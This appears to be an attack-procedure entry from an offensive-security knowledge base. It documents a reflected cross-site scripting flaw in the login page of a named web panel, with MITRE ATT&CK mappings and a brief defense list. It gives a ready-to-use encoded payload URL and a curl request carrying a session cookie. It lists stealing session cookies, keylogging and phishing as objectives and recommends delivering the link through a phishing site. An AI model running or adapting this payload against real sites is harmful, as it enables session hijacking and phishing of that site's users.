---
tags:
  - xss
  - reflected-xss
  - javascript-execution
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-xss-injection-stopthehacker]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: 69418f5d-575d-4468-84e1-a981bb743b6b
created_at: '2025-12-14T03:16:14.671Z'
updated_at: '2025-12-14T03:16:14.671Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Reflected-XSS-Payload-into-Login-Endpoint

## Summary

This procedure exploits a reflected Cross-site Scripting (XSS) vulnerability in the /login/ endpoint of the StopTheHacker panel by injecting a malicious payload into the 'loc' parameter of a GET request, leading to arbitrary JavaScript execution in the victim's browser.

## Description

The StopTheHacker panel fails to sanitize or encode the 'loc' parameter in the /login/ endpoint, allowing attackers to inject HTML and JavaScript tags. By crafting a URL with a payload like 'de'><script>prompt(994787)</script>', the input is reflected back into the HTML response without escaping, executing the script when rendered in the browser. This can steal cookies, session tokens, or perform phishing attacks. The target environment is a web application accessible via public internet, requiring no authentication for the vulnerable endpoint.

## Requirements

1. Network access to https://panel.stopthehacker.com
2. Ability to craft and deliver malicious URLs (e.g., via email or social engineering)
3. Standard HTTP client (curl, browser, or proxy like Burp Suite)

## Defense

Defensive measures and detection strategies:

- Implement input validation and output encoding (e.g., HTML-escape user inputs on reflection)
- Use Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous JavaScript payloads in request logs and WAF alerts for script tags

## Objectives

1. Trigger JavaScript execution in the victim's browser context
2. Steal sensitive data like session cookies
3. Enable further client-side attacks such as keylogging or phishing

## Instructions

### Step 1: Craft the Malicious Payload

**Context**: URL-encode the XSS payload to bypass basic filters while ensuring it breaks out of the HTML attribute and injects a script tag.

No command needed; manually construct the URL: https://panel.stopthehacker.com/login/?loc=de%22%3E%3Cscript%3Eprompt(994787)%3C/script%3E

> The payload 'de"><script>prompt(994787)</script>' closes the attribute (assuming 'loc=de' is reflected as <input value="de"...>) and injects the script.

### Step 2: Send the Malicious Request

**Context**: Simulate or deliver the GET request to the endpoint, mimicking a legitimate browser to test or exploit.

**Command** ([[commands/curl-xss-injection-stopthehacker]]):
```bash
curl -X GET "https://panel.stopthehacker.com/login/?loc=de%22%3E%3Cscript%3Eprompt(994787)%3C/script%3E" \
  -H "Referer: https://panel.stopthehacker.com" \
  -H "Cookie: sth_panel=9fj5MyELdr2SAJ3yNP5p%2C3" \
  -H "Host: panel.stopthehacker.com" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36" \
  -v
```

> This command sends the request with original headers for realism. In exploitation, host the URL on a phishing site or send via link. Expected output includes the reflected payload in the response body, confirming vulnerability.

### Step 3: Verify Execution

**Context**: Load the URL in a browser to confirm JavaScript runs, observing the prompt dialog.

Use a browser or proxy to visit the crafted URL and inspect the response for unencoded script execution.

> Success is indicated by the prompt(994787) dialog appearing, proving arbitrary JS execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xss-injection-stopthehacker]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web-vulnerability]]
